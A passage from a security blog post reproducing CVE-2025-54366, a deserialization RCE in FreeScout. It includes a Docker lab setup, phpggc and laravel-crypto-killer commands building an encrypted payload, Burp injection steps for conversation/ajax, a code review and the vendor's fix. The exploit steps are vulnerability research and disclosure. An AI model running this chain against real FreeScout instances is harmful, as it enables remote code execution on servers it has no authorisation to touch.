<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data</title>
      <link href="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/"/>
      <url>/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/</url>
      
        <content type="html"><![CDATA[<p>Originally posted on my <a href="https://github.com/securitytaters/vulnerability-research/tree/main/N-Day%20CVE/CVE-2025-54366">github</a></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Recently, a new CVE-2025-54366 was disclosed in <a href="https://github.com/freescout-help-desk/freescout">freescout</a> - a free self-hosted help desk &amp; shared mailbox. This vulnerability involves using APP_KEY to craft a PHP serialized payload that will fire when it reaches <code>Helper::decrypt</code> function used in conversation flow. You can read more about APP_KEY and its exploitation at <a href="https://blog.gitguardian.com/exploiting-public-app_key-leaks/">exploiting-public-app_key-leaks</a> and at <a href="https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis">laravel-appkey-leakage-analysis</a>. Below is my attempt at reproducing the CVE and my analysis of it in detail.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>In order to setup a vulnerable instance of freescout I used below docker-compose file. This is a slightly modified version of <a href="https://github.com/tiredofit/docker-freescout/blob/main/examples/docker-compose-no-proxy.yml">this file</a>. I have updated the <code>image</code> <code>ports</code> and <code>SITE_URL</code> variables, keeping rest the same.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">freescout-app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/freescout:php8.3-1.17.122</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">9100</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="comment">### If you want to perform customizations to the source and have access to it, then uncomment this line - This includes modules</span></span><br><span class="line">    <span class="comment">#- ./data:/www/html</span></span><br><span class="line">    <span class="comment">### Or, if you just want to use Stock Freescout and hold onto persistent files like cache and session use this, one or the other.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./data:/data</span></span><br><span class="line">    <span class="comment">### If you want to just keep the original source and add additional modules uncomment this line</span></span><br><span class="line">    <span class="comment">#- ./modules:/www/html/Modules</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./logs/:/www/logs</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-app</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_HOST=freescout-db</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="string">SITE_URL=http://localhost:9100</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ADMIN_EMAIL=admin@admin.com</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ADMIN_PASS=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ENABLE_SSL_PROXY=FALSE</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DISPLAY_ERRORS=FALSE</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TIMEZONE=America/Vancouver</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">freescout-db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/mariadb</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./db:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_PASS=password</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-db</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">freescout-db-backup:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-db-backup</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/db-backup</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./dbbackup:/backup</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-db-backup</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_HOST=freescout-db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_TYPE=mariadb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB01_BACKUP_INTERVAL=1440</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB01_BACKUP_BEGIN=0000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_CLEANUP_TIME=8640</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">COMPRESSION=BZ</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MD5=TRUE</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><p>Place the above file in your working directory and use below command to spin up instance of the freescout</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>The freescout portal will be available at <code>http://localhost:9100/</code>. For ease of exploitation you can proxy this to Burp Suite or any proxy of your choice. Login with credentials setup in the <code>ADMIN_EMAIL</code> and <code>ADMIN_PASS</code> variable in the docker-compose.yaml file.</p><h2 id="Steps-to-Reproduce-the-CVE"><a href="#Steps-to-Reproduce-the-CVE" class="headerlink" title="Steps to Reproduce the CVE"></a>Steps to Reproduce the CVE</h2><ol><li>We need to setup a few thing to reproduce the vulnerability and craft our RCE exploit. First, download and install <a href="https://github.com/synacktiv/laravel-crypto-killer">laravel-crypto-killer</a> and <a href="https://github.com/ambionics/phpggc">phpggc</a></li><li>As mentioned in the advisory we need APP_KEY and a user account to exploit this issue. In a real world scenario you would need another vulnerability like LFI to access the .env file. For now we will just use the APP_KEY from our docker instance as shown below.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/www/html <span class="comment"># cat .env </span></span><br><span class="line"><span class="comment">#### Automatically Generated File - Upon container restart any settings will reset!</span></span><br><span class="line">APP_URL=http://localhost:9100</span><br><span class="line">SESSION_SECURE_COOKIE=<span class="literal">false</span></span><br><span class="line">APP_DEBUG=<span class="literal">false</span></span><br><span class="line">APP_KEY=<span class="built_in">base64</span>:ZT6QMwgEO3PqeX/J3s2QmtR7bcmAi027xSW9bnHWPk8=</span><br><span class="line">DB_CONNECTION=mysql</span><br></pre></td></tr></table></figure><ol start="5"><li>Next we also need to know the Laravel version used by freescout. We use following command to do that.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/html # php artisan --version</span><br><span class="line">Laravel Framework 5.5.40</span><br></pre></td></tr></table></figure><ol start="6"><li>Now we use phpggc to check for gadgets specific to our Laravel version as shown below.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">php8.3 phpggc -l laravel</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME             VERSION                  TYPE                  VECTOR        I    </span><br><span class="line">Laravel/FD1      *                        File delete           __destruct    *    </span><br><span class="line">Laravel/RCE1     5.4.27                   RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE2     5.4.0 &lt;= 8.6.9+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE3     5.5.0 &lt;= 5.8.35          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE4     5.4.0 &lt;= 8.6.9+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE5     5.8.30                   RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE6     5.5.* &lt;= 5.8.35          RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE7     ? &lt;= 8.16.1              RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE8     7.0.0 &lt;= 8.6.9+          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE9     5.4.0 &lt;= 9.1.8+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE10    5.6.0 &lt;= 9.1.8+          RCE: Function Call    __toString         </span><br><span class="line">Laravel/RCE11    5.4.0 &lt;= 9.1.8+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE12    5.8.35, 7.0.0, 9.3.10    RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE13    5.3.0 &lt;= 9.5.1+          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE14    5.3.0 &lt;= 9.5.1+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE15    5.5.0 &lt;= v9.5.1+         RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE16    5.6.0 &lt;= v9.5.1+         RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE17    10.31.0                  RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE18    10.31.0                  RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE19    10.34                    RCE: Command          __destruct         </span><br><span class="line">Laravel/RCE20    5.6 &lt;= 10.x              RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE21    5.1.*                    RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE22    v10.0.0 &lt;= v11.34.2+     RCE: Function Call    __destruct         </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li>We can use Laravel&#x2F;RCE4 as that matches our version of Laravel. Next we create our payload using following command. Once run it will create a file named <code>rce</code> in <code>/tmp/</code> directory. <code>-b</code> option encodes our payload into base64 format.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php8.3 phpggc Laravel/RCE4 system &quot;touch /tmp/rce&quot; -b</span><br><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6MTQ6InRvdWNoIC90bXAvcmNlIjt9</span><br></pre></td></tr></table></figure><ol start="8"><li>Next we need to encrypt this payload using laravel-crypto-killer tool as shown below using the APP_KEY. This is our final payload.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python laravel_crypto_killer.py encrypt -k base64:ZT6QMwgEO3PqeX/J3s2QmtR7bcmAi027xSW9bnHWPk8= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6MTQ6InRvdWNoIC90bXAvcmNlIjt9</span><br><span class="line"></span><br><span class="line">[+] Here is your laravel ciphered value, happy hacking mate!</span><br><span class="line">eyJpdiI6ICJQVmczZ09janUweEFHWVpjRWc3bkhRPT0iLCAidmFsdWUiOiAiSmg3N00wNHVjT1NabmdBdFlOZ0RKVVcyMlIwUUp3ZTMyT09qbE5iKzV1Y1hXZTU3RHcwSmdaUWZVN2RhQUt3cHlYc0tON1ZJOE5PRUVFWjB5MGk1b2N6QlBRNzZJanlZclQ3K1JrVlBpNTUyd1NMeUg5NmRzNll3cDJ0Q3lFdzhsVENjYkN6RWViNGVhMHE5THNxdmFvc1dCYTBQb3gvYis4YVpnZEJaWkR5TGwyWGtwSGM2N3R0QmFhTXlmMEIvd09MQ3pPakNBUU56MlNpMVZZTEhLRGZjdjVWeWJ0dmMycTlNbkZlQzlYWTdwTkhqYi9md0NmUDRDekRybkIwNUlkSzczM3VXclFNMklGRnVlT1lTQkE9PSIsICJtYWMiOiAiMmY2ZGEyYzJmY2IwYTBiMjI5ZTdmNDUwMzQ5NTU5Y2NlYmJlYzY3NzgzMmUzMDFjY2M0ZmQyMGJmODBkY2RmNiIsICJ0YWciOiAiIn0=</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="9"><li>Based the PoC request in the CVE advisory, the vulnerable endpoint is <code>conversation/ajax</code>. To reach there we need create our first mailbox. When we login for the first time it walks us through the creation of mailbox. This also creates an email ID for e.g. <code>support@localhost.com</code> which we will use.</li><li>Next we create conversation with the with any email ID. We will use the one created in the above step. It can be done by visiting the <a href="http://localhost:9100/mailbox/1/new-ticket">http://localhost:9100/mailbox/1/new-ticket</a> endpoint or from the side menu. Enter the <code>To</code> and <code>Subject</code> and anything in the body similar to below screenshot.</li></ol><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/new-convo.png" alt="new-convo"></p><ol start="11"><li>Now access the conversation as shown below.</li></ol><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/access-convo.png" alt="access-convo"></p><ol start="12"><li>Here is a slightly tricky part. Now reply to this conversation with an any attachment. Once you reach the point 3 as shown in below image, we need to have the intercept on in the Burp Suite proxy to capture the request on point 4. Otherwise the request goes through in the background and we do not get the initial request we need to exploit the RCE. This is the request that will give us the vulnerable parameters <code>attachments_all[]</code> and <code>attachments[]</code> on <code>conversation/ajax</code> endpoint.</li></ol><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/attachment-req.png" alt="attachment-req"></p><ol start="12"><li>Once you capture the request send it to repeater using <code>Ctrl+r</code> shortcut. Below is the original request with the parameters we need for our payload.</li></ol><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/original-req.png" alt="original-req"></p><ol start="13"><li>Next we update the highlighted parameters with the final payload we created earlier as shown below. Ensure the payload is URL encoded if needed and send the request. Its the case for me as my final payload has a trailing <code>=</code>. Once done you will something like below as sign of successful exploitation.</li></ol><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/edited-req.png" alt="edited-req"></p><ol start="14"><li>Next we verify that the file was created in our docker instance as shown below confirming remote code execution.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ls -l /tmp/</span><br><span class="line">total 0</span><br><span class="line">-rw-r--r--    1 nginx    www-data         0 Jul 29 22:32 rce</span><br><span class="line">/ # </span><br></pre></td></tr></table></figure><h2 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h2><p>Lets dive into some code and understand the flow of the request. Here is a quick walkthrough of how user provided input ends up in the unserialize function without any validation resulting in to RCE. </p><blockquote><p>This is where you can take help of AI to speed up your process. I added the code to VScode and ask the copilot to help me this.</p></blockquote><ol><li>HTTP Request Entry Point - This is our vulnerable request and parameter as seen above.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /conversation/ajax</span><br><span class="line"><span class="attribute">Parameters</span><span class="punctuation">: </span>attachments_all[] and attachments[]</span><br></pre></td></tr></table></figure><ol start="2"><li>Route Processing (routes&#x2F;web.php:65) - Next freescout will route this request to ConversationsController as shown below.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/conversation/ajax&#x27;</span>, [<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;ConversationsController@ajax&#x27;</span>, <span class="string">&#x27;laroute&#x27;</span> =&gt; <span class="literal">true</span>])</span><br></pre></td></tr></table></figure><ol start="3"><li>Controller Entry (ConversationsController.php:571) - This is where type of action is checked, which in our case is <code>send_reply</code>.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">Request <span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$request</span>-&gt;action) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;send_reply&#x27;</span>:</span><br><span class="line">            <span class="comment">// Process the request</span></span><br></pre></td></tr></table></figure><ol start="4"><li>Attachment Processing (ConversationsController.php:851) - If attachments are found those gets passed to <code>processReplyAttachments</code> function for further processing.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get attachments info</span></span><br><span class="line"><span class="comment">// Delete removed attachments.</span></span><br><span class="line"><span class="variable">$attachments_info</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">processReplyAttachments</span>(<span class="variable">$request</span>);</span><br></pre></td></tr></table></figure><ol start="5"><li>The Vulnerable Function (ConversationsController.php:3134) - Here is the vulnerable call to <code>decodeAttachmentsIds</code> that processes our input from <code>attachments_all</code> and <code>attachments</code> parameters.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processReplyAttachments</span>(<span class="params"><span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$has_attachments</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$attachments</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$request</span>-&gt;attachments_all)) &#123;</span><br><span class="line">        <span class="variable">$embeds</span> = [];</span><br><span class="line">        <span class="variable">$attachments_all</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodeAttachmentsIds</span>(<span class="variable">$request</span>-&gt;attachments_all);  <span class="comment">// ← VULNERABLE CALL</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$request</span>-&gt;attachments)) &#123;</span><br><span class="line">            <span class="variable">$attachments</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodeAttachmentsIds</span>(<span class="variable">$request</span>-&gt;attachments);      <span class="comment">// ← VULNERABLE CALL</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>The Critical Vulnerability (ConversationsController.php:3162) - This is the <code>\Helper::decrypt</code> function that decrypt the <code>attachment_id</code> as mentioned in the advisory.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeAttachmentsIds</span>(<span class="params"><span class="variable">$attachments_list</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$attachments_list</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$attachment_id</span>) &#123;</span><br><span class="line">        <span class="variable">$attachment_id_decrypted</span> = <span class="title class_">\Helper</span>::<span class="title function_ invoke__">decrypt</span>(<span class="variable">$attachment_id</span>);  <span class="comment">// ← DESERIALIZATION HELPER</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$attachment_id_decrypted</span> == <span class="variable">$attachment_id</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$attachments_list</span>[<span class="variable">$i</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$attachments_list</span>[<span class="variable">$i</span>] = <span class="variable">$attachment_id_decrypted</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$attachments_list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>The Vulnerable Decrypt Function (Helper.php:892) - This is where the unsafe deserialization happens.</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$password</span> = <span class="literal">null</span>, <span class="variable">$unserialize</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">app</span>(<span class="string">&#x27;encrypter&#x27;</span>)-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="variable">$unserialize</span>); <span class="comment">// DESERIALIZATION HAPPENS HERE</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = (<span class="keyword">new</span> <span class="title class_">\Illuminate\Encryption\Encrypter</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)))-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="variable">$unserialize</span>); <span class="comment">// DESERIALIZATION HAPPENS HERE</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>As you may have noticed there is no input validation or any sort of checks done on the <code>attachment_id</code> parameter to avoid unsafe deserialization. </p><h3 id="Fix-for-the-vulnerability"><a href="#Fix-for-the-vulnerability" class="headerlink" title="Fix for the vulnerability"></a>Fix for the vulnerability</h3><p>Lets look at the fix that has been implemented now. Here is the link to the diff from their github <a href="https://github.com/freescout-help-desk/freescout/commit/e2de65f3f32f825b4ec5558643ed81438c9a6bc6">e2de65f3f32f825b4ec5558643ed81438c9a6bc6</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$password</span> = <span class="literal">null</span>, <span class="variable">$force_unserialize</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">app</span>(<span class="string">&#x27;encrypter&#x27;</span>)-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = (<span class="keyword">new</span> <span class="title class_">\Illuminate\Encryption\Encrypter</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)))-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the value is scalar - unserialize it,</span></span><br><span class="line">        <span class="comment">// Otherwise - do not, as objects may contain dangerous code.</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;^[dsa]:&quot;</span>, <span class="variable">$value</span>) || <span class="variable">$force_unserialize</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>unserialize</code> has been replaced with <code>force_unserialize</code> and set to false to not allow deserialization by default.</li><li><code>false</code> parameter has been added to line 5 and 7 to decrypt call</li><li>Next lines have a regex check for <code>$value</code> which check if its starts with <code>d</code> or <code>s</code> or <code>a</code> which represents below 